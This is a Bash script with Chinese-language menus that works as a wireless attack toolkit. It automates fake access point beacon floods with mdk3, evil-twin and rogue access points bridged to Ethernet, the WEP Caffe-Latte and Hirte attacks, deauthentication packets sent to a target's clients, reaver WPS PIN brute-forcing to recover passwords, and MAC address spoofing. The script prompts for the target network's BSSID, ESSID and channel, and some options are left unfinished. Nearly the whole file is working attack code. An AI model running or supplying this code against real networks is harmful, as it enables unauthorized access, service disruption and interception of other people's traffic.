#!/bin/bash

pyName="python3" #use python3

function setcard() {
	#mon=$(echo `sudo airmon-ng`|grep "phy" |cut -d ' ' -f6)
	mon=$(sudo airmon-ng start ${interface} | grep "mac80211 monitor" | cut -d "]" -f3 | cut -d ")" -f1)
	
	echo -e "\n [*] 可使用 'sudo airmon-ng stop ${mon}' 来暂停 airmon-ng."
	#Use mon
	if [ $option == newsAP ]; then
        echo " [+] 正在运行(使用 'Ctrl+C' 终止)..."
        sudo mdk3 ${mon} b -a -f code/news.txt -s 200
    elif [ $option == diyAP ]; then
        echo "Not FINISH!"
        echo " [+] 正在运行(使用 'Ctrl+C' 终止)..."
		read -p " [?] 输入自定义文件所在位置: "  filename
        sudo mdk3 ${mon} b -a -f $filename -s 200
    elif [ $option == random ]; then
        echo " [+] 正在运行(使用 'Ctrl+C' 终止)..."
        sudo mdk3 ${mon} b -a -s 200
    elif [ $option == EvilTwin ]; then
	     YBridgeSet
		 sudo airbase-ng -a $tb --essid "$ts" -c $tc ${mon}&
	 	 netbridge
	elif [ $option == coffeeLatte ]; then
		 YBridgeSet
		 sudo airbase-ng -a $tb --essid "$ts" -L -W 1 -c $tc ${mon}&
		 netbridge
		 echo -e " [#] 在另外一个终端(1)使用命令：'sudo airodump-ng $mon -c $tc --essid "$ts" -w [filename]'"
		 echo -e " [#] 在另外一个终端(2)使用命令：'sudo aircrack-ng [filename]'"
	elif [ $option == hirte ]; then
		 NBridgeSet
		 sudo airbase-ng -a $tb --essid "$ts" -N -W 1 -c $tc ${mon}&
	 	 netbridge
		 echo -e " [#] 在另外一个终端(1)使用命令：'sudo airodump-ng $mon -c $tc --essid "$ts" -w [filename]'"
		 echo -e " [#] 在另外一个终端(2)使用命令：'sudo aircrack-ng [filename]'"
	elif [ $option == MITM -o $option == mitm ]; then
		 echo "Not finish"
	elif [ $option == getpin ]; then
		 echo " [#] 此功能基于: reaver"
		 echo -e " [#] 在另外一个终端(1)使用命令：'sudo wash -i ${mon}'若报错则加上'--ignore-fcs'"
		 echo -e " [#] 在另外一个终端(2)使用命令：'sudo airodump-ng ${mon}'检查是否开启WPS功能"
		 read -p ' [?] 输入对象的MAC地址: ' wpsMAC
		 read -p ' [?] 输入对象的Channel: ' wpsC
		 read -p ' [?] 设置闲置时间(根据网络状况而定,默认为1): ' delay
		 #显示过程(-vv)
		 sudo reaver -i ${mon} -b ${wpsMAC} -vv -d${delay} -c ${wpsC}
		 read -p ' [&] 是否再次获取该AP密码? [Y/N] ' key
		 if [ $key == "Y" -o $key == "y"  ]; then
			  read -p ' [?] 输入取得的PIN: ' pin
			  sudo reaver -i ${mon} -b ${wpsMAC} -p ${pin}
		 else
			  echo " [-] 退出，请记录好PIN和密码"
			  exit 1
		 fi
	fi
}

function netbridge() {

	sudo brctl addbr Wifi-Bridge
	sudo brctl addif Wifi-Bridge $ethName
	sudo brctl addif Wifi-Bridge at0
	sudo ifconfig $ethName 0.0.0.0 up
	sudo ifconfig at0 0.0.0.0 up
	sudo echo 1 > /proc/sys/net/ipv4/ip_forward
	sudo ifconfig Wifi-Bridge up
	echo " [!] 请注意出错提示"
	echo " [+] 运行中...(使用 'Ctrl+C' 终止 airbase-ng.)"
	
}

function ethset() {
	read -p " [!] 是否选择要使用的以太网接口(默认: $eth0)? [Y/N]" ethChange
	if [ $ethChange == "Y" -o $ethChange == "y"  ]; then
		sudo ifconfig
		read -p " [!] 选择以太网接口: " ethUse
		ethCheck=$(sudo ifconfig $ethUse|grep "$ethUse"|cut -d ':' -f1)
		
		# Need check exist
		if [ "$ethCheck" == "$ethUse" ]; then
			ethName="$ethUse"
			echo " [+] 使用此网卡: $ethUse"
		else
			exit 1
		fi
	fi
}

function bridgeQA() {
	echo " [!] 需要知道对象的[MAC Address,SSID，Channel]."
	read -p ' [?] 输入对象的BSSID: ' tb
	read -p ' [?] 输入对象的ESSID: ' ts
	read -p ' [?] 输入对象的Channel: ' tc
}

function NBridgeSet() {
	 # interface
	 bridgeQA
	 ethName="eth0"
	 ethset
	 sudo iwconfig $interface channel $tc
	 read -p ' [!] 是否向对象发送断开连接包? [Y/N] ' qsend
	 if [ $qsend == "Y" -o $qsend == "y"  ]; then
		  sudo aireplay-ng -0 5 -a $tb --ignore-negative-one $interface
	 else
		  echo " [=] 不发送."
	 fi
}

function YBridgeSet() {
	 # mon
	 bridgeQA
     ethName="eth0"
	 ethset
	 sudo iwconfig ${mon} channel $tc
	 read -p ' [!] 是否向对象发送断开连接包? [Y/N] ' qsend
	 if [ $qsend == "Y" -o $qsend == "y"  ]; then
	     sudo aireplay-ng -0 5 -a $tb --ignore-negative-one ${mon}
	 else
	     echo " [=] 不发送."
     fi
}

function option_tree() {
	while :
	do
		echo -e "\n 选项:"
		echo " [1] 制造AP"
		echo " [2] WiFi协议攻击"
		echo " [3] 无线攻击"
		echo " [4] 扫描工具"
		echo -e "\033[31m [9] 退出 \033[0m"
		echo ""
		read -p '[&] 选择功能类别: ' tree1
		echo "-------------------------------------------\
----------------------------------"
		if [ $tree1 == 1 ]; then
			 o1="fakeap"
		elif [ $tree1 == 2 ]; then
		     o1="protocol"
		elif [ $tree1 == 3 ]; then
			 o1="attack"
		elif [ $tree1 == 4 ]; then
		 	 o1="scanap"
		elif [ $tree1 == 9 ]; then
			 exit 0
		else
			 echo -e "\n[-] 未知选项: $o1"
		fi
		if [ $o1 == fakeap ]; then
			#FakeAP,用于制造AP
			while :
			do
					echo -e "\n 选项:"
					echo " [1] random"
					echo " [2] newsAP"
					echo " [3] diyAP"
					echo -e "\033[31m [9] 返回 \033[0m"
					echo ""
					read -p ' [&] 选择要执行的功能: ' o2
					echo "-------------------------------------------\
----------------------------------"
					if [ $o2 == 1 ]; then
						option="random"
						break 2
					elif [ $o2 == 2 ]; then
						option="newsAP"
						break 2
					elif [ $o2 == 3 ]; then
						option="diyAP"
						break 2
					elif [ $o2 == 9 ]; then
						continue 2
					else
						echo -e "\n[-] 未知选项: $o2"
					fi
			done
		elif [ $o1 == protocol ]; then
			#Wifi,用于无线攻击
			while :
			do
				echo -e "\n 选项:"
				echo " [1] WEP"
				echo " [2] WPS"
				echo " [3] WPA"
				echo " [4] WPA2"
				echo -e "\033[31m [9] 返回 \033[0m"
				echo ""
				read -p '[&] 选择WiFi协议: ' o2
				echo "-------------------------------------------\
----------------------------------"
				if [ $o2 == 1 ]; then
					o3="wep"
				elif [ $o2 == 2 ]; then
					o3="wps"
				elif [ $o2 == 3 ]; then
					o3="wpa"
				elif [ $o2 == 4 ]; then
					o3="wpa2"
				elif [ $o2 == 9 ]; then
					continue 2
				else
					echo -e "\n[-] 未知选项: $o2"
				fi

			if [ $o3 == wep ]; then
					while :
					do
						echo -e "\n 选项(WEP):"
						echo " [1] Coffee-Latte 攻击"
						echo " [2] Hirte 攻击"
						echo -e "\033[31m [9] 返回 \033[0m"
						echo ""
						read -p ' [&] 选择要执行的功能: ' o4
						if [ $o4 == 1 ]; then
							option="coffeeLatte"
							break 4
						elif [ $o4 == 2 ]; then
							option="hirte"
							break 4
						elif [ $o4 == 9 ]; then
							continue 2
						else
							echo -e "\n[-] 未知选项: $o4"
						fi
					done
			elif [ $o3 == wps ]; then
					while :
					do
						echo -e "\n 选项(WPS):"
						echo " [1] 暴力破解PIN和密码(可能会失败)"
						echo -e "\033[31m [9] 返回 \033[0m"
						echo ""
						read -p ' [&] 选择要执行的功能: ' o4
						if [ $o4 == 1 ]; then
								option="getpin"
								break 4
						elif [ $o4 == 9 ]; then
								continue 2
						else
								echo -e "\n[-] 未知选项: $o4"
						fi
					done
			elif [ $o3 == wpa ]; then
					#read -p '[&] 选择要执行的功能: ' o4
					echo "Not finish"
					exit 0
			elif [ $o3 == wpa2 ]; then
					#read -p '[&] 选择要执行的功能: ' o4
					echo "Not finish"
					exit 0
			else
					echo "[#] 代码出错"
			fi
			done
		elif [ $o1 == attack ]; then
			while :
			do
					echo -e "\n 选项:"
					echo " [1] evil-twin"
					echo " [2] MITM"
					echo -e "\033[31m [9] 返回 \033[0m"
					echo ""
					read -p ' [&] 选择要执行的功能: ' o2
					echo "-------------------------------------------\
----------------------------------"
					if [ $o2 == 1 ]; then
						option="EvilTwin"
						break 2
					elif [ $o2 == 2 ]; then
						option="MITM"
						break 2
					elif [ $o2 == 9 ]; then
						continue 2
					else
						echo -e "\n[-] 未知选项: $o2"
					fi
			done
		elif [ $o1 == scanap ]; then
			#airodump: airodump-ng(Aircrack-ng)
			#wash: wash(reaver)
			while :
			do
				echo -e "\n 扫描工具:"
				echo " [1] airodump-ng"
				echo " [2] wash"
				echo " [3] wifite"
				echo -e "\033[31m [9] 返回 \033[0m"
				echo ""
				read -p ' [&] 选择扫描工具: ' o2
				if [ $o2 == 1 ]; then
					option="airodump"
					break 2
				elif [ $o2 == 2 ]; then
					option="wash"
					break 2
				elif [ $o2 == 3 ]; then
					option="wifite"
					break 2
				elif [ $o2 == 9 ]; then
					continue 2
				else
					echo -e "\n [-] 未知选项: $o2"
				fi
			done

		else
			echo -e "\n [-] 未知选项: $o1"
			exit 1	 	  
		fi
	done	
}

echo ""
echo "[+] 列出无线网卡:"
echo ""
sudo iwconfig
read -p "[&] 请选择无线网卡 : " interface
echo "-------------------------------------------\
----------------------------------"
check=$(sudo iwconfig $interface)
#echo $check
if [ ! -n "$check" ]; then

	echo "[-] 此接口没有无线功能"

else
    mcheck=$(sudo iwconfig $interface|grep "Mode:" |cut -d ':' -f2|cut -d ' ' -f1)
    
	skipset="n"
	
	option_tree
    if [ $option == newsAP ]; then
		
		echo " [=] 选项: newsAP"
		echo " [+] 正在获取新闻..."
		echo ""
		echo "-------------------------------------------\
----------------------------------"
		IP="news.sina.com.cn"
		testNet=`ping -c 2 $IP | grep "100% packet loss" | wc -l`
		if [ "${testNet}" != 0 ];then
			 echo -e " [-] 无法连接到'${IP}'."
			 exit 1
		else
			 #check python path or name
			 sudo $pyName code/getnews.py
		fi
	elif [ $option == diyAP ]; then
		 echo "未完成!"
		 #diy file.
	elif [ $option == random ]; then
		 echo " [=] 选项: random"
	elif [ $option == EvilTwin ]; then
		 echo " [=] 选项: evil-twin"
	elif [ $option == coffeeLatte ]; then
		 echo " [=] 选项: Coffee-latte"
	elif [ $option == hirte ]; then
		 echo " [=] 选项: Hirte"
	elif [ $option == getpin ]; then
		 echo " [=] 选项: getPIN"
	elif [ $option == wash ]; then
		 echo "-------------------------------------------\
-------------------------------------"
		 sudo wash -i $interface
		 exit 0
	elif [ $option == airodump ]; then
		 sudo airodump-ng $interface
		 exit 0
	elif [ $option == wifite ]; then
		 sudo wifite
		 exit 0
	else
		 echo " [-] 未知选项: $option"
		 exit 0
    fi

    read -p ' [!] 是否更换MAC地址? [Y/N] ' key
    if [ $key == "Y" -o $key == "y"  ]; then
        sudo ifconfig $interface down
	    sudo macchanger -A $interface
	    sudo ifconfig $interface up
        echo -e "[*] 可使用 (需要终止 airmon-ng)\n'sudo ifconfig ${interface} down && sudo macchanger -p \
${interface} && sudo ifconfig ${interface} up'\n[*] 恢复原来的MAC地址.(需要终止 airmon-ng.)"
    else
        echo " [-] 不改变MAC地址"
		echo "-------------------------------------------\
----------------------------------"
	fi
		
	if [ "${mcheck}" == "Monitor" ]; then
		read -p " [!] 是否跳过网卡设置? [Y/N]" skipset
        if [ $skipset == "Y" -o $skipset == "y" ]; then
		 	if [ $option == newsAP ]; then
		 	 	  echo " [+] 正在运行(使用 'Ctrl+C' 终止)..."
                  sudo mdk3 $interface b -a -f code/news.txt -s 200
			elif [ $option == diyAP ]; then
		 	 	  echo "Not FINISH!"
				  read -p "[&] 输入自定义文件所在位置: "  filename
		 	 	  echo " [+] 正在运行(使用 'Ctrl+C' 终止)..."
                  sudo mdk3 $interface b -a -f $filename -s 200
			elif [ $option == random ]; then
		 	 	  echo " [+] 正在运行(使用 'Ctrl+C' 终止)..."
                  sudo mdk3 $interface b -a -s 200
			elif [ $option == EvilTwin ]; then
			 	  NBridgeSet
				  sudo airbase-ng -a $tb --essid "$ts" -c $tc $interface&
				  netbridge
			elif [ $option == coffeeLatte ]; then
				  NBridgeSet
				  sudo airbase-ng -a $tb --essid "$ts" -L -W 1 -c $tc $interface&
	 			  netbridge
				  echo -e " [#] 在另外一个终端(1)使用命令：'sudo airodump-ng $interface -c $tc --essid "$ts" -w [filename]'"
				  echo -e " [#] 在另外一个终端(2)使用命令：'sudo aircrack-ng [filename]'"
			elif [ $option == hirte ]; then
				  NBridgeSet
				  sudo airbase-ng -a $tb --essid "$ts" -N -W 1 -c $tc $interface&
	 			  netbridge
				  echo -e " [#] 在另外一个终端(1)使用命令：'sudo airodump-ng $interface -c $tc --essid "$ts" -w [filename]'"
				  echo -e " [#] 在另外一个终端(2)使用命令：'sudo aircrack-ng [filename]'"
            elif [ $option == MITM -o $option == mitm ]; then
			 	  echo "Not finish."
			
			elif [ $option == getpin ]; then
				  echo " [#] 此功能基于: reaver"
				  echo -e " [#] 在另外一个终端(1)使用命令：'sudo wash -i ${interface}'若报错则加上'--ignore-fcs'"
				  echo -e " [#] 在另外一个终端(2)使用命令：'sudo airodump-ng ${interface}'检查是否开启WPS功能"
				  read -p ' [?] 输入对象的MAC地址: ' wpsMAC
				  read -p ' [?] 设置闲置时间(根据网络状况而定,默认为1): ' delay
				  read -p ' [?] 输入对象的Channel: ' wpsC
				  #显示过程(-vv)
				  sudo reaver -i ${interface} -b ${wpsMAC} -d${delay} -c ${wpsC} -vv
				  read -p ' [&] 是否再次获取该AP密码? [Y/N] ' key
				  if [ $key == "Y" -o $key == "y" ]; then
				  		 read -p ' [?] 输入取得的PIN: ' pin
						 sudo reaver -i ${interface} -b ${wpsMAC} -p ${pin}
				  else
				  	     echo " [-] 退出，请记录好PIN和密码"
						 exit 0
				  fi
			fi
        else
			 echo -e "\n [-] 正在重新设置网卡"
			 sudo airmon-ng stop ${interface}
			 interface=$( sudo airmon-ng stop ${interface} | grep "mac80211 station" | cut -d "]" -f2 | cut -d ")" -f1)
			 setcard
		fi
    else 
		 setcard
    fi
    
fi
